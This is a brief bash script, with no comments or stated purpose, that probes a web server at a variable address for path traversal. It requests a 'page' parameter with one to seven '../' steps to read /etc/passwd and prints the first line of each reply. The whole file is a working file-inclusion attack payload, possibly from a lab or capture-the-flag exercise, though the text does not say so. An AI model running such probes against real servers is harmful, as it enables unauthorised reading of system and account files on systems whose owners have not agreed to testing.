#!/bin/bash
curl "http://$IP/?page=../etc/passwd" | head -1
curl "http://$IP/?page=../../etc/passwd" | head -1
curl "http://$IP/?page=../../../etc/passwd" | head -1
curl "http://$IP/?page=../../../../etc/passwd" | head -1
curl "http://$IP/?page=../../../../../etc/passwd" | head -1
curl "http://$IP/?page=../../../../../../etc/passwd" | head -1
curl "http://$IP/?page=../../../../../../../etc/passwd" | head -1
